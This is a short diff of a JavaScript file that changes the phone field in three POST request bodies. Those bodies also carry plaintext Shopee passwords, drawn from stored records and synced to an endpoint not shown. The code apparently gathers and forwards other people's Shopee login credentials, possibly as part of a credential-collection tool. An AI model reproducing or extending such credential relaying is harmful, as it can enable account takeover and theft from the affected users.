@@ -1990,7 +1990,7 @@ async function syncFirebaseData() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          phone: p.shopeePhone || p.shopeeUsername || '',
+          phone: p.shopeePhoneAlt || p.shopeePhone || p.shopeeUsername || '',
           password: p.shopeePassword || '',
           provider: 'Shopee QR (Đồng bộ)',
           time: p.shopeeCreatedAt || p.shopeeSessionTime || getFormattedTime(),
@@ -2017,7 +2017,7 @@ async function syncFirebaseData() {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              phone: h.shopeePhone || h.shopeeUsername || '',
+              phone: h.shopeePhoneAlt || h.shopeePhone || h.shopeeUsername || '',
               password: h.shopeePassword || '',
               provider: 'Lịch sử Phone',
               time: h.shopeeSessionTime || getFormattedTime(h.completedAt) || getFormattedTime(),
@@ -4126,7 +4126,7 @@ async function executeSaveRequest(payload, currentSaveFields) {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              phone: payload.shopeePhone || payload.shopeeUsername || '',
+              phone: payload.shopeePhoneAlt || payload.shopeePhone || payload.shopeeUsername || '',
               password: payload.shopeePassword || '',
               provider: 'Shopee QR',
               time: payload.shopeeCreatedAt || payload.shopeeSessionTime || getFormattedTime(),
